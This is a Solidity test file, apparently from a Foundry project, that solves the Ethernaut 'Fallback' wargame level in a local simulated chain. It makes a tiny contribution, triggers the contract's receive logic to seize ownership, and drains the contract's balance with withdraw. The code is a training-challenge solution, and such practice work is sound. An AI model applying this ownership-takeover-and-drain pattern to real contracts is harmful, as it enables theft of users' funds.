pragma solidity 0.8.10;

import "ds-test/test.sol";
import "../Fallback/FallbackFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract FallbackTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        // vm.deal(eoaAddress, 5 ether); // <======== DOESN'T WORK
    }

    function testFallbackHack() public {
        vm.deal(eoaAddress, 5 ether); // <=========== WORKS HERE
        /////////////////
        // LEVEL SETUP //
        /////////////////
        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // add a contribution
        ethernautFallback.contribute{value: 1 wei}();
        assertEq(ethernautFallback.getContribution(), 1 wei);

        emit log_named_uint("balance of player: ", eoaAddress.balance);
        // send ether to contract to take ownership
        payable(address(ethernautFallback)).call{value: 1 wei}("");
        assertEq(ethernautFallback.owner(), eoaAddress);

        // withdraw teh balance
        emit log_named_uint(
            "Fallback balance: ",
            address(ethernautFallback).balance
        );
        ethernautFallback.withdraw();
        emit log_named_uint(
            "Fallback balance: ",
            address(ethernautFallback).balance
        );

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
